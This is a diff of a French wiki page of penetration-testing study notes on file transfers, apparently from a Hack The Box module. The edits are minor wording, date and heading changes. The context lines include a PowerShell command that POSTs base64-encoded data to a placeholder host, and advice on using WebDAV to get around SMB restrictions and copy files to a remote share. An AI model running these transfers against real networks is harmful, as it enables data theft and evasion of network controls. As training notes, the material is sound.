@@ -2,7 +2,7 @@
 title: File Transfers
 description: 
 published: true
-date: 2025-03-29T13:26:41.863Z
+date: 2025-03-29T13:27:18.487Z
 tags: notes, htb, module
 editor: markdown
 dateCreated: 2025-03-16T15:21:30.098Z
@@ -264,7 +264,7 @@ Invoke-WebRequest -Uri http://<adresse>:<port>/ -Method POST -Body $b64
 Par précaution, le port 445 (SMB) est souvent restreint au réseau interne de l'organisation.
 Pour plus d'informations vous pouvez consulter le post Microsoft "[Preventing SMB traffic from lateral connections and entering or leaving the network](https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a)".
 
-Pour contourner cela, il est possible d'utiliser SMB over HTTP avec [WebDAV](https://datatracker.ietf.org/doc/html/rfc4918).
+Pour contourner cette restriction, il est possible d'utiliser SMB over HTTP avec [WebDAV](https://datatracker.ietf.org/doc/html/rfc4918).
 WebDAV est une extension du protocole HTTP qui permet aux serveurs web de se comporter comme des serveurs de fichiers (supportant la création de contenu collaboratif). WebDAV peut aussi utiliser HTTPS.
 
 Par défaut lors de l'utilisation d'un client SMB, lors d'une tentative de connexion à un partage SMB et si aucun partage SMB n'est disponbile alors le client va essayer de se connecter en utilisant HTTP.
@@ -304,4 +304,6 @@ Pour copier un fichier vers le dossier Shared du serveur WebDAV:
 ```
 copy <fichier> \\192.168.49.129\Shared\
 ```
+
+### FTP Uploads
 
